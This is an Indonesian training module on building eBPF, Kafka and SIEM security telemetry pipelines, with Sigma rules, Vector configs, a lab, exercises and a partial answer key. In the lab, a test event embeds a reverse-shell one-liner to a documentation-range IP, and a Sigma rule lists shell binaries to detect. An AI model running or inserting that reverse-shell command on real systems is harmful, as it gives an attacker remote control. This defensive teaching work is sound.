# BAB 10: Observabilitas Keamanan & SIEM
## Modul 02: Deep Dive, Implementasi Lanjutan & Arsitektur Produksi

---

### 1. Learning Objective

Setelah menyelesaikan modul ini, peserta diharapkan mampu:
- **Menganalisis & Mengarsitekrasi** pipeline observabilitas keamanan berkinerja tinggi berbasis kernel (*eBPF-driven telemetry*) dan stream ingestion yang mampu menangani beban hingga $\ge 100.000$ *Events Per Second* (EPS) tanpa degradasi performa aplikasi produksi.
- **Mengimplementasikan** pipeline telemetry menggunakan **Vector** / **Fluent Bit**, **Apache Kafka**, dan **OpenSearch/Elastic SIEM** dengan pengayaan metadata (*context enrichment*) runtime Kubernetes dan cloud provider secara *real-time*.
- **Menerapkan** standardisasi deteksi ancaman menggunakan **Sigma Rules** yang dikompilasi secara otomatis menjadi kueri deteksi SIEM native.
- **Mengonfigurasi** mitigasi *backpressure*, *ring-buffer tuning*, dan manajemen retensi berbasis *hot-warm-cold tiered storage* guna mengoptimalkan biaya infrastruktur dan kepatuhan audit regulasi (PCI-DSS, ISO 27001, SOC 2).
- **Mendiagnosis & Mengatasi** isu performa telemetri kritis, seperti *kernel event dropping*, OOM (*Out Of Memory*) pada agregator log, dan fenomena *alert fatigue*.

---

### 2. Prerequisite

Peserta wajib memiliki pemahaman mendalam pada domain berikut:
- **Linux Kernel & OS Internals**: Konsep dasar *Syscalls*, *cgroups*, *namespaces*, *Linux Security Modules* (LSM), dan arsitektur *Ring Buffer*.
- **Containerization & Orchestration**: Kubernetes runtime (CRI-O/containerd), RBAC, DaemonSets, dan Audit Logging.
- **Data Streaming & Pipelines**: Arsitektur Apache Kafka (partisi, *consumer groups*, *offset management*) atau message broker enterprise serupa.
- **Security Foundations**: MITRE ATT&CK Framework, taksonomi insiden siber, dan format log standar (CEF, ECS, OCSF).

---

### 3. Concept & Internal Architecture

Observabilitas keamanan modern menuntut visibilitas instan tanpa mengorbankan performa sistem (*low-overhead, non-blocking*). Pendekatan tradisional berbasis polling atau interceptor *userspace* (seperti `auditd` warisan) memperkenalkan beban CPU dan *context-switching* berlebih pada tingkat *throughput* tinggi.

Arsitektur produksi tingkat lanjut memisahkan observabilitas keamanan ke dalam 4 lapisan inti:

```
[ KERNEL SPACE ]
  ├── eBPF Programs (LSM Hooks, Tracepoints, Kprobes)
  └── Perf Event / BPF Ring Buffer (Per-CPU, Lockless)
          │ Zero-Copy Read
[ USER SPACE: NODE-LEVEL AGENTS ]
  ├── Detection Engine (Falco / Tetragon)
  └── High-Performance Forwarder (Vector / Fluent Bit)
          │ Protobuf / gRPC / mTLS
[ PIPELINE & BROKER LAYER ]
  └── Distributed Buffer (Apache Kafka Enterprise Cluster)
          │ Consumer Group Processing
[ STREAM PROCESSING & SIEM ]
  ├── Stream Enrichment & Correlation (Flink / Vector Aggregator)
  ├── Search & Analytics Index (OpenSearch / ClickHouse)
  └── Alerting & Orchestration (Sigma Engine, SOAR)
```

#### A. Kernel Tracing Menggunakan eBPF (Extended Berkeley Packet Filter)
eBPF mengeksekusi *sandboxed bytecode* di dalam kernel Linux tanpa mengubah *source code* kernel atau memuat modul kernel eksternal.
1. **LSM Hooks (`bpf_lsm`)**: Memberikan kontrol dan observasi langsung pada tingkat keamanan kernel sebelum aksi sistem dilakukan (misalnya: `security_bprm_check`, `security_file_open`).
2. **BPF Ring Buffer**: Menggantikan *BPF Perf Buffer* lama. Menggunakan memori sirkular *single-producer multi-consumer* atau *multi-producer single-consumer* yang meminimalkan fragmentasi memori, menghindari *lock contention*, dan mendukung transmisi data *zero-copy* ke *userspace*.

#### B. Normalisasi Skema Data (OCSF & ECS)
Data dari berbagai sumber (AWS CloudTrail, Kubernetes API Server, Linux Syscalls, NGINX Ingress) harus dinormalisasi sebelum tahap korelasi. Standar de facto industri:
- **Elastic Common Schema (ECS)**: Berorientasi dokumen JSON, ideal untuk integrasi Elastic Stack.
- **Open Cybersecurity Schema Framework (OCSF)**: Standar terbuka berbasis vendor-agnostik yang membagi event menjadi *Classes*, *Categories*, dan *Activities*.

#### C. Real-Time Enrichment Engine
Sebelum diindeks, log mentah harus diperkaya dengan konteks operasional:
- Identitas Pod, Namespace, Node, Image Hash (dari Kubernetes API Watcher cache).
- Identitas User IAM Cloud dan Context Role.
- Threat Intelligence Feed (IP Reputation, Tor Exit Nodes) melalui *in-memory radix tree / Bloom filter*.

---

### 4. Why & What

| Dimensi | Legacy Logging (`auditd`, Syslog UDP) | Modern Security Observability (eBPF + Stream Pipeline) |
| :--- | :--- | :--- |
| **Titik Pengumpulan** | User-space hooks / Sinkronus `auditd` netlink socket | Kernel-space asynchronous eBPF probes & ring buffers |
| **Overhead CPU** | Tinggi (15% - 35% pada traffic disk/network masif) | Sangat Rendah (< 1.5% - 3% rata-rata) |
| **Ketahanan Anti-Tamper** | Rendah; proses root penyerang dapat mematikan `auditd` | Sangat Tinggi; eBPF dimuat di kernel, kontrol via `CAP_SYS_ADMIN` / `CAP_BPF` |
| **Konteks Kontainer** | Buta kontainer (hanya melihat PID dan UID host) | Mengidentifikasi *cgroup ID*, *pod namespace*, *container ID* secara native |
| **Throughput & Skalabilitas** | Bottleneck pada I/O disk lokal & drop UDP | Mampu menangani > 1.000.000 EPS secara horizontal via Kafka |
| **Standar Kueri** | Regex kustom / Bash script rapuh | Format deklaratif standar industri (**Sigma**, YARA-L) |

---

### 5. How (Workflow Detail)

Alur kerja pemrosesan event keamanan end-to-end:

```
[Kernel Event Triggered: execve()]
          │
          ▼
[eBPF Probe in Tetragon/Falco] ──(Validation: Not Whitelisted)
          │
          ▼
[Emit JSON via BPF Ring Buffer to Userspace Agent]
          │
          ▼
[Vector Agent (Node DaemonSet)]
   ├─ Enrich: Attach Kube-Metadata (Labels, Pod CIDR, Namespace)
   ├─ Filter: Drop noisy heartbeats & synthetic health-checks
   └─ Batch & Compress: ZSTD compression
          │
          ▼ (mTLS TLSv1.3)
[Kafka Ingestion Topic: sec.raw.events]
          │
          ▼
[Vector Stream Aggregator Cluster / Flink]
   ├─ Normalize: Map to ECS (process.name, process.args, user.id)
   ├─ Correlate: Match against Sigma Rule Engine
   └─ Route:
        ├─ High Severity Alerts ──► PagerDuty / Webhook SOAR
        ├─ Security Events       ──► OpenSearch (Hot Tier: SSD NVMe)
        └─ Audit Compliance Data ──► S3 Object Storage (Cold Tier: Parquet)
```

1. **Detection & Extraction**: Aktor menjalankan command terlarang (misal: `curl metadata-service` dari pod backend). eBPF probe mendeteksi syscall `sys_enter_connect`.
2. **Contextual Enrichment**: Vector agent lokal yang berjalan di DaemonSet membaca socket runtime `/run/containerd/containerd.sock` atau cache memori untuk menyisipkan identitas pod.
3. **Buffering & Backpressure Management**: Event dikirimkan ke Kafka broker menggunakan partisi terdistribusi berdasarkan `container_id` untuk menjamin retensi sekuensial event.
4. **Correlation & Routing**: Aggregator membandingkan aliran data secara *stateful* dengan rule Sigma. Jika terjadi anomali (misal: *reverse shell spawn*), alert instan diterbitkan ke platform SOAR, sedangkan event dasar diindeks ke OpenSearch.

---

### 6. Analogy & Diagram ASCII

#### Analogi Gerbang Tol & Pemindai Beban Otomatis
Metode lama (`auditd`) bagaikan setiap truk kontainer dihentikan di pos sempit, sopir turun, dan petugas memeriksa dokumen secara manual satu per satu—menyebabkan kemacetan panjang di jalan tol (aplikasi macet/freeze).

Arsitektur eBPF + SIEM modern bagaikan sistem pemindai bobot berkecepatan tinggi (*weigh-in-motion*) dengan sensor optik di atas jalan raya. Truk melaju pada kecepatan 100 km/jam; sensor langsung memindai pelat nomor, volume, dan muatan secara nirkabel, lalu mengirim data ke pusat kontrol analitik tanpa memperlambat laju kendaraan sedikit pun.

#### Diagram Arsitektur Produksi Skala Enterprise

```
+------------------------------------------------------------------------------------+
| KUBERNETES WORKER NODE (Node-01 .. Node-N)                                         |
|                                                                                    |
|  +------------------------+      +----------------------------------------------+  |
|  | User Application Pod   |      | Security DaemonSet Engine (eBPF Agent)       |  |
|  | (PID 4022 in cgroup)   |      |                                              |  |
|  |                        |      |  +----------------------------------------+  |  |
|  | [App Process]          |      |  | Falco / Tetragon Userspace Consumer     |  |  |
|  +-----------│------------+      |  +-------------------▲--------------------+  |  |
|              │ Syscall           +----------------------│-----------------------+  |
| ═════════════╪══════════════════════════════════════════╪═════════════════════════ |
| KERNEL SPACE │                                          │ Zero-Copy Ring Buffer    |
|              ▼                                          │                          |
|  [Syscall: execve / connect] ──► [eBPF Hook / LSM] ─────┘                          |
+------------------------------------------------------------------------------------+
                                           │
                                           │ Unix Domain Socket (JSON Stream)
                                           ▼
+------------------------------------------------------------------------------------+
| VECTOR AGENT (Host-Level DaemonSet)                                                |
|  - Parse Syscall Telemetry                                                         |
|  - In-Memory Kubernetes API Metadata Cache (Namespace, Pod, Labels)                |
|  - VRL (Vector Remap Language) Transformations                                     |
|  - Disk-backed Buffer (Dukungan Crash Recovery)                                   |
+------------------------------------------------------------------------------------+
                                           │
                                           │ mTLS 1.3 / Snappy / Batch 5MB
                                           ▼
+------------------------------------------------------------------------------------+
| BUFFERING LAYER: APACHE KAFKA CLUSTER                                              |
|                                                                                    |
|  Topic: sec-telemetry-k8s-raw (Partitions: 32, Replication: 3, Min-ISR: 2)        |
+------------------------------------------------------------------------------------+
                                           │
                                           ▼
+------------------------------------------------------------------------------------+
| CENTRAL PROCESSING & SIEM LAYER                                                    |
|                                                                                    |
|  +------------------------------------------------------------------------------+  |
|  | Stream Aggregators (Vector Aggregator / Apache Flink)                        |  |
|  |  - Sigma Rule Engine Evaluation (Pattern Matching in RAM)                    |  |
|  |  - Threat Intel Dynamic Enrichment (MaxMind GeoIP + AbuseIPDB Memory Cache)  |  |
|  +-----------------------┬------------------------------┬-----------------------+  |
|                          │                              │                          |
|            Critical Hit  │                              │ Standard Stream          |
|                          ▼                              ▼                          |
|  +-----------------------------------+  +---------------------------------------+  |
|  | SOAR / Alert Dispatcher           |  | OpenSearch / Elasticsearch Cluster    |  |
|  | (Cortex, TheHive, PagerDuty)      |  |  - Hot Nodes (NVMe Tier - Retensi 7d) |  |
|  | Webhook to Kubernetes Network     |  |  - Warm Nodes (SSD Tier - Retensi 30d)|  |
|  | Policy Engine (Isolate Pod)       |  |  - S3 Snapshot (Cold Tier - 365d)     |  |
|  +-----------------------------------+  +---------------------------------------+  |
+------------------------------------------------------------------------------------+
```

---

### 7. Simple Example & Practical Example

#### A. Contoh Sederhana: Sigma Rule untuk Deteksi Shell Spawning di Pod
Simpan sebagai: `rules/sigma/k8s_shell_exec.yml`

```yaml
title: Shell Spawned Inside Kubernetes Container
id: 9a2f7d3e-4b1a-4f9e-b81b-93d3b76cf1a2
status: production
description: Mendeteksi eksekusi shell interaktif di dalam runtime kontainer yang melanggar standar immutable infrastructure.
references:
  - https://attack.mitre.org/techniques/T1059/004/
author: DevSecOps Architecture Team
date: 2024/02/10
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
      - '/bin/zsh'
      - '/bin/dash'
  k8s_context:
    k8s.namespace|startswith: 'prod-'
  condition: selection and k8s_context
falsepositives:
  - Sesi debug resmi via k8s exec oleh engineer terotorisasi (harus diaudit via API server audit log)
level: high
tags:
  - attack.execution
  - attack.t1059.004
```

#### B. Contoh Praktis: Pipeline Vector Skala Produksi (Vector Config)
Implementasi konfigurasi pengolahan streaming event yang mengubah raw Falco/eBPF JSON menjadi skema ECS, memperkaya data, dan mendistribusikannya secara aman ke Apache Kafka.

Simpan sebagai: `pipeline/vector/vector.yaml`

```yaml
sources:
  falco_socket:
    type: socket
    address: /var/run/falco/falco.sock
    mode: unix
    decoding:
      codec: json

transforms:
  normalize_and_enrich:
    type: remap
    inputs:
      - falco_socket
    source: |
      # Inisialisasi ECS Data Structure
      .ecs = {}
      .ecs.version = "8.11.0"
      
      # Timestamp mapping
      .ecs.timestamp = .time
      
      # Event Categorization
      .ecs.event = {}
      .ecs.event.kind = "alert"
      .ecs.event.category = ["process", "intrusion_detection"]
      .ecs.event.action = .rule
      .ecs.event.severity = .priority
      
      # Process Context
      .ecs.process = {}
      .ecs.process.pid = .output_fields."proc.pid"
      .ecs.process.ppid = .output_fields."proc.ppid"
      .ecs.process.name = .output_fields."proc.name"
      .ecs.process.executable = .output_fields."proc.exepath"
      .ecs.process.command_line = .output_fields."proc.cmdline"
      
      # Host and Kubernetes Metadata
      .ecs.host = {}
      .ecs.host.hostname = .hostname
      
      .ecs.orchestrator = {}
      .ecs.orchestrator.type = "kubernetes"
      .ecs.orchestrator.namespace = .output_fields."k8s.ns.name"
      .ecs.orchestrator.pod = {}
      .ecs.orchestrator.pod.name = .output_fields."k8s.pod.name"
      .ecs.orchestrator.pod.id = .output_fields."k8s.pod.id"
      
      # Hapus payload mentah yang berlebih untuk menghemat bandwidth
      del(.output_fields)
      del(.source)

  filter_drop_healthchecks:
    type: filter
    inputs:
      - normalize_and_enrich
    condition:
      type: vrl
      source: |
        # Filter noise dari kubelet prober
        !(.ecs.process.name == "kubelet" || .ecs.process.name == "healthcheck")

sinks:
  kafka_siem_buffer:
    type: kafka
    inputs:
      - filter_drop_healthchecks
    bootstrap_servers: "kafka-cluster-kafka-bootstrap.telemetry.svc.cluster.local:9092"
    topic: "sec.k8s.alerts.v1"
    encoding:
      codec: json
    compression: zstd
    buffer:
      type: disk
      max_size: 5368709120 # 5 GiB Disk buffer per pod untuk isolasi outage Kafka
      when_full: block
    tls:
      enabled: true
      ca_file: /etc/vector/certs/ca.crt
      crt_file: /etc/vector/certs/client.crt
      key_file: /etc/vector/certs/client.key
```

---

### 8. Real World Case Study (Enterprise Scale)

#### Konteks Sistem
- **Entitas**: Neobank Tier-1 (12.000 Transaksi Finansial per Detik).
- **Infrastruktur**: 4.000 Node Kubernetes tersebar di 3 Region AWS (EKS), menjalankan lebih dari 35.000 container mikroservis.
- **Beban Telemetri Keamanan**: Rata-rata 280.000 EPS, dengan lonjakan hingga 550.000 EPS saat jam sibuk transaksi.

#### Insiden: Upaya Eksploitasi Container Escape & Data Exfiltration
1. **Vektor Serangan**: Penyerang memanfaatkan celah deserialisasi pada dependensi pod Java publik, mendapatkan shell lokal non-root (`www-data`).
2. **Eskalasi & Breakout**: Penyerang mencoba mengeksploitasi kerentanan kernel *local privilege escalation* (CVE-2024-21626 / runc breakout variant) untuk mengakses root file host `/proc/sys/kernel/core_pattern`.
3. **Mekanisme Deteksi**:
   - `Tetragon` (eBPF LSM hook) memicu event instan saat syscall `openat` menyentuh path terlarang `/proc/sys/kernel/*` dari cgroup container ID.
   - Vector mendeteksi flag `CAP_SYS_ADMIN` disalahgunakan dan memformat alert dalam ECS.
   - Event tiba di Kafka broker dalam waktu **85 milidetik**.
   - Stream processing mengidentifikasi kombinasi anomali: Pod HTTP eksternal + akses file sistem kernel + koneksi IP luar tak dikenal.
4. **Respon Terotomatisasi (SOAR)**:
   - Kafka engine memicu consumer webhook SOAR.
   - Kubernetes API Server menerima instruksi mutasi otomatis: Melakukan patching pada NetworkPolicy pod tersebut (karantina jaringan) dan men-drain Pod yang terinfeksi untuk analisis forensik memori tanpa merestart node.
   - Waktu total dari eksekusi syscall hingga karantina jaringan: **780 milidetik**.

---

### 9. Trade-offs (Performance, Latency, Scalability, Cost)

```
+-------------------------------------------------------------------------------------------------------------------------+
| DIMENSI              | PENDEKATAN A: Direct-to-SIEM (Agent -> OpenSearch)    | PENDEKATAN B: Broker-Driven (eBPF->Kafka->Agg->SIEM) |
+-------------------------------------------------------------------------------------------------------------------------+
| Performance Overhead | Sedang; Indexing load berfluktuasi pada cluster SIEM  | Sangat Rendah; Node hanya bertugas ship data terkompresi |
+----------------------+-------------------------------------------------------+------------------------------------------------------+
| Ingestion Latency    | Sangat Rendah (100ms - 300ms)                         | Rendah - Sedang (500ms - 2000ms akibat micro-batching)|
+----------------------+-------------------------------------------------------+------------------------------------------------------+
| Reliability / Spikes | Buruk; Beban tinggi menyebabkan drop/rate limit       | Sangat Tangguh; Kafka bertindak sebagai shock absorber |
+----------------------+-------------------------------------------------------+------------------------------------------------------+
| Cost (Infra)         | Rendah untuk throughput kecil (< 10.000 EPS)          | Optimal pada skala besar (> 100.000 EPS);            |
|                      | Sangat Mahal untuk scale-out compute SIEM             | Komputasi indexing terpisah dari stream enrichment   |
+----------------------+-------------------------------------------------------+------------------------------------------------------+
| Storage Efficiency   | Indexing JSON langsung; konsumsi storage disk tinggi | Parquet/ZSTD cold storage offloading menghemat 70%   |
+-------------------------------------------------------------------------------------------------------------------------+
```

---

### 10. Common Mistakes & Troubleshooting

#### Kesalahan Umum 1: Mengabaikan Kapasitas eBPF Ring Buffer
*Gejala*: Pesan error kernel `perf_event_output failed: -524` atau drop counter eBPF meningkat drastis saat traffic network melonjak.
*Akar Masalah*: Buffer size default eBPF (biasanya 4KB atau 8KB per CPU core) tidak mampu menampung burst event syscall sebelum dikonsumsi oleh agent userspace.
*Solusi*: Perbesar ring buffer size pada manifest agen keamanan (misal Falco buffer):
```yaml
# Helm values.yaml untuk Falco
falco:
  ring_buffer:
    pages: 2048 # (2048 * 4KB = 8MB per CPU core)
```

#### Kesalahan Umum 2: Memory OOM-Kills pada Pipeline Forwarder
*Gejala*: Vector DaemonSet pod berulang kali restart dengan status `OOMKilled` (Exit Code 137).
*Akar Masalah*: Forwarder menggunakan buffering in-memory tanpa batas saat Kafka cluster lambat (*backpressure propagation*).
*Solusi*: Batasi buffer memori secara eksplisit dan alihkan overflow ke disk (*disk-backed buffer*):
```yaml
buffer:
  type: disk
  max_size: 2147483648 # Batasi maksimum 2GB pada disk node
  when_full: block
```

#### Kesalahan Umum 3: Alert Fatigue Akibat Noise Polling Kubelet
*Gejala*: SOC menerima ribuan alert "File Opened Under /etc/kubernetes" per hari.
*Akar Masalah*: Rule deteksi tidak mengisolasi thread sistem internal Kubernetes (`kubelet`, `containerd-shim`) dari aktivitas user pod.
*Solusi*: Lakukan tuning filter di layer agent terdepan (*edge filter*) menggunakan VRL atau ekspresi Falco sebelum event dikirim ke broker.

---

### 11. Best Practices (Production Checklist)

- [ ] **eBPF Agent Privileges**: Batasi hak akses container agent hanya ke `CAP_BPF`, `CAP_PERFMON`, dan `CAP_SYS_ADMIN` jika kernel $\ge 5.8$; hindari penggunaan `privileged: true` secara menyeluruh.
- [ ] **Transport Encryption**: Seluruh transmisi event wajib menggunakan TLS 1.3 dengan mTLS (*mutual authentication*) antara node agent, Kafka broker, dan SIEM indexer.
- [ ] **Stream Compression**: Aktifkan kompresi berbasis `zstd` level 3 pada publisher Kafka; memberikan rasio kompresi hingga 60-70% lebih kecil dibanding `gzip` dengan penggunaan CPU yang lebih efisien.
- [ ] **Tenant Partitioning**: Gunakan metadata Kubernetes (`k8s.namespace`) atau Cloud Account ID sebagai Partition Key Kafka untuk memastikan paralelisme pemrosesan data antar tenant tetap adil (*fair queuing*).
- [ ] **Tiered Retention Architecture**:
  - Hot Storage (SSD NVMe): Retensi 7 hari untuk kueri investigasi instan SOC.
  - Warm Storage (EBS gp3): Retensi 30 hari untuk kueri agregasi dan audit berkala.
  - Cold Storage (S3 / GCS via Parquet format): Retensi 365+ hari untuk kepatuhan regulasi finansial.
- [ ] **Dynamic Sigma Compilation**: Mengotomatisasi deployment rule Sigma melalui pipeline CI/CD (GitHub Actions/GitLab CI) menggunakan utility `sigmac` atau `pySigma` langsung ke konfigurasi alert SIEM secara terprogram.

---

### 12. Hands-on Practice

Implementasi pipeline observabilitas keamanan modular: **Falco Mock Provider $\rightarrow$ Vector Parser $\rightarrow$ Kafka Broker $\rightarrow$ OpenSearch Sink**.

Simpan file-file berikut di folder `hands-on/m02/`.

#### Langkah 1: Siapkan Struktur Proyek
```bash
mkdir -p hands-on/m02/{pipeline,certs,data}
cd hands-on/m02
```

#### Langkah 2: Buat File Docker Compose Multi-Service
Simpan sebagai: `docker-compose.yml`

```yaml
version: '3.8'

services:
  zookeeper:
    image: confluentinc/cp-zookeeper:7.5.0
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_TICK_TIME: 2000
    networks:
      - sec-net

  kafka:
    image: confluentinc/cp-kafka:7.5.0
    depends_on:
      - zookeeper
    ports:
      - "9092:9092"
    environment:
      KAFKA_BROKER_ID: 1
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:29092,PLAINTEXT_HOST://localhost:9092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
    networks:
      - sec-net

  opensearch:
    image: opensearchproject/opensearch:2.11.0
    environment:
      - discovery.type=single-node
      - bootstrap.memory_lock=true
      - "OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m"
      - DISABLE_SECURITY_PLUGIN=true
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    ports:
      - "9200:9200"
    networks:
      - sec-net

  vector:
    image: timberio/vector:0.35.0-alpine
    depends_on:
      - kafka
      - opensearch
    volumes:
      - ./pipeline/vector.toml:/etc/vector/vector.toml:ro
    ports:
      - "9000:9000" # Dummy log receiver
    networks:
      - sec-net

networks:
  sec-net:
    driver: bridge
```

#### Langkah 3: Konfigurasi Pipeline Vector
Simpan sebagai: `pipeline/vector.toml`

```toml
[sources.dummy_security_events]
type = "http_server"
address = "0.0.0.0:9000"
decoding.codec = "json"

[transforms.normalize_ecs]
type = "remap"
inputs = ["dummy_security_events"]
source = '''
.ecs = {}
.ecs.version = "8.11.0"
.ecs.timestamp = .timestamp || now()
.ecs.event = {}
.ecs.event.action = .rule_name || "unknown"
.ecs.event.severity = .severity || "info"

.ecs.process = {}
.ecs.process.name = .proc_name
.ecs.process.command_line = .cmdline

.ecs.host = {}
.ecs.host.hostname = .host || "k8s-worker-node"
'''

[sinks.kafka_pipeline]
type = "kafka"
inputs = ["normalize_ecs"]
bootstrap_servers = "kafka:29092"
topic = "security-events-ecs"
encoding.codec = "json"

[sinks.opensearch_direct]
type = "opensearch"
inputs = ["normalize_ecs"]
endpoint = "http://opensearch:9200"
index = "soc-alerts-%Y.%m.%d"
mode = "bulk"
bulk.index = "soc-alerts-%Y.%m.%d"
```

#### Langkah 4: Jalankan dan Uji Ingestion Pipeline
1. Jalankan stack:
   ```bash
   docker compose up -d
   ```
2. Tunggu seluruh service berstatus `healthy` atau stabil (sekitar 20 detik).
3. Simulasikan pengiriman event deteksi exploitasi kernel:
   ```bash
   curl -X POST http://localhost:9000/ \
     -H "Content-Type: application/json" \
     -d '{
       "rule_name": "Terminal Shell Spawning in Container",
       "severity": "CRITICAL",
       "proc_name": "/bin/bash",
       "cmdline": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
       "host": "k8s-prod-worker-04"
     }'
   ```
4. Verifikasi bahwa data berhasil masuk dan diindeks secara otomatis di OpenSearch:
   ```bash
   curl -X GET "http://localhost:9200/soc-alerts-*/_search?pretty"
   ```
5. Periksa ketersediaan payload dalam format ECS di field response `_source.ecs`.

---

### 13. Exercise

#### Level: Easy
- **Tugas**: Tambahkan filter pada file `pipeline/vector.toml` yang menolak event jika field `.cmdline` mengandung string `/healthz` atau string `/readyz`.
- **Kriteria Keberhasilan**: Data testing dengan command `/healthz` tidak muncul pada index pencarian OpenSearch.

#### Level: Medium
- **Tugas**: Tulis rule deteksi Sigma lengkap yang mengidentifikasi pembacaan direktori credential Kubernetes secrets (`/var/run/secrets/kubernetes.io/serviceaccount/token`) oleh proses selain binari yang terdaftar di whitelist (`aws-iam-authenticator`, `vault-agent`).
- **Kriteria Keberhasilan**: File Sigma valid secara sintaksis dan berhasil dikompilasi menggunakan utility `sigma-cli` menjadi kueri Lucene/OpenSearch: `pySigma` syntax test lolos.

#### Level: Hard
- **Tugas**: Konfigurasikan Vector buffer menggunakan mode `disk` dengan batasan memori maksimum 100MB, lalu simulasikan *network partition* buatan (hentikan service Kafka menggunakan `docker stop`). Kirimkan 1.000 event HTTP ke Vector, hidupkan kembali service Kafka, dan buktikan seluruh 1.000 event terkirim tanpa data loss (*zero-drop guarantee*).
- **Kriteria Keberhasilan**: Evaluasi `_count` dokumen di OpenSearch sama persis dengan jumlah payload yang di-post selama downtime Kafka.

---

### 14. Challenge

**Skenario Tantangan**: Perusahaan Anda berencana mengadopsi arsitektur Zero-Trust di Kubernetes cluster, namun terbentang batasan regulasi di mana log sensitif (seperti Authorization Header, Token JWT, PII field) tidak boleh masuk ke SIEM pusat dalam bentuk plain text.

**Instruksi Desain & Implementasi**:
1. Buat pipeline transformasi VRL (*Vector Remap Language*) mutakhir yang secara dinamis:
   - Mendeteksi adanya JWT Token (`Bearer eyJ...`) pada seluruh sub-field JSON mentah secara rekursif menggunakan ekspresi reguler berkinerja tinggi.
   - Melakukan *hashing* menggunakan algoritma `SHA-256` dengan *system salt* pada token yang ditemukan (bukan masking asterisk) agar SOC tetap dapat melakukan korelasi penyerang tanpa melihat credential asli.
2. Hitung estimasi latency overhead yang ditambahkan oleh pemrosesan Regex + Cryptographic Hash tersebut per event.
3. Rancang strategi arsitektur jika terjadi kondisi di mana throughput log melonjak mendadak sebesar 10x lipat (misalnya dari 20.000 EPS menjadi 200.000 EPS akibat serangan Distributed Denial of Service).

---

### 15. Quiz Evaluasi Pemahaman

#### A. Pertanyaan Basic
1. Mengapa logging berbasis kernel tracepoint via eBPF memiliki overhead CPU yang jauh lebih rendah dibandingkan interupsi `auditd` netlink socket tradisional?
2. Apa peran utama penggunaan format ECS (*Elastic Common Schema*) atau OCSF pada observabilitas keamanan enterprise?
3. Mengapa distributed streaming queue (seperti Apache Kafka) mutlak dibutuhkan di antara agen pengumpul log keamanan dan klaster penyimpanan SIEM?
4. Apa konsekuensi teknis jika kita menggunakan buffering memori murni (`type = "memory"`) pada agent pengumpul log saat terjadi outage backend ingestion?
5. Apakah rule deteksi Sigma terikat secara eksklusif pada satu vendor SIEM tertentu? Jelaskan konsep abstraksinya.

#### B. Pertanyaan Intermediate
6. Jelaskan perbedaan mendasar antara *BPF Perf Buffer* dan *BPF Ring Buffer* dalam penanganan transmisi data event keamanan berkecepatan tinggi!
7. Pada situasi apa pengayaan data (*enrichment*) log keamanan sebaiknya dilakukan di tingkat Agen Edge (DaemonSet) dibanding di tingkat Central Stream Aggregator?
8. Bagaimana teknik mitigasi untuk mencegah serangan *Log Injection* / *Log Poisoning* saat memproses input syslog tidak terstruktur?
9. Apa perbedaan esensial dari aspek deteksi keamanan antara syscall `execve` dan `execveat`? Mengapa tools monitoring eBPF modern wajib memantau keduanya?
10. Sebutkan trade-off mendasar antara algoritma kompresi data `Zstandard (ZSTD)` dan `GZIP` dalam pengiriman event telemetri skala tinggi.

#### C. Skenario Kasus Produksi
11. **Skenario 1**: Sebuah node Kubernetes yang memproses beban machine learning intensif mengalami packet drop hingga 40% pada streaming event keamanan ke SIEM, namun CPU utilization node secara keseluruhan masih tercatat di bawah 65%. Analisis kemungkinan akar masalah yang terjadi di tingkat kernel subsystem dan BPF buffer!
12. **Skenario 2**: SOC Anda mengeluhkan fenomena keterlambatan deteksi (*ingestion lag*) hingga lebih dari 45 menit pada OpenSearch saat terjadi insiden keamanan, meskipun Kafka broker memiliki resource compute yang cukup. Langkah-langkah apa yang harus dieksekusi untuk mengidentifikasi dan memulihkan bottleneck tersebut?
13. **Skenario 3**: Penyerang berhasil membobol sebuah container dan menghapus file binary `/bin/rm`, lalu menggantinya dengan binary rootkit buatan sendiri. Jelaskan secara teknis bagaimana eBPF tracing berbasis LSM hooks mampu mendeteksi dan menghentikan aksi ini secara real-time sebelum file dieksekusi!

---

### Kunci Jawaban & Solusi Evaluasi

#### Jawaban Pertanyaan Basic
1. **Overhead Rendah eBPF**: eBPF berjalan di context kernel menggunakan buffer sirkular tanpa context switching berulang (*user-to-kernel mode*). `auditd` memicu context switch pada setiap syscall dan membebani sistem logging sinkronus yang dapat memblokir eksekusi thread aplikasi.
2. **Standardisasi Data**: ECS/OCSF memungkinkan korelasi multi-sumber secara instan. Tim deteksi cukup menulis satu aturan Sigma/kueri analitik, dan aturan tersebut dapat langsung mendeteksi ancaman lintas platform (AWS, k8s, On-Prem Linux).
3. **Pentingnya Kafka Broker**: Sebagai *shock absorber* (*decoupling buffer*) yang menangani lonjakan (*burst*) volume log keamanan. Jika cluster SIEM sedang mengalami re-indexing atau maintenance, data tidak hilang (*zero data loss*).
4. **Resiko Buffering Memori**: Terjadinya kegagalan OOM (*Out of Memory*) pada pod agent yang berakibat pada termination proses dan hilangnya log secara permanen (*data loss*) jika node mengalami crash/restart.
5. **Abstraksi Sigma**: Tidak terikat vendor. Sigma adalah format YAML deklaratif terbuka. Kompiler (*Sigma CLI/pySigma*) menerjemahkan abstraksi kondisi log source ke dalam sintaks native Elasticsearch Lucene, Splunk SPL, QRadar AQL, atau SQL ClickHouse.

#### Jawaban Pertanyaan Intermediate
6. **BPF Perf vs Ring Buffer**: Perf Buffer mengalokasikan memori independen per CPU core, menyebabkan boros memori dan rentan *event re-ordering* saat dikonsumsi userspace. Ring Buffer adalah memori bersama global (*lockless ring buffer*), mendukung *event ordering* sekuensial alami, dan alokasi memori yang jauh lebih efisien serta *zero-copy*.
7. **Lokasi Enrichment**: Edge enrichment (DaemonSet) ideal untuk konteks lokal volatil yang cepat hilang seperti container ID, pod labels, dan PID namespaces. Central enrichment ideal untuk data eksternal dinamis berskala besar seperti database Threat Intel (IP reputation feeds yang berukuran puluhan gigabyte) yang tidak efisien disimpan di setiap node.
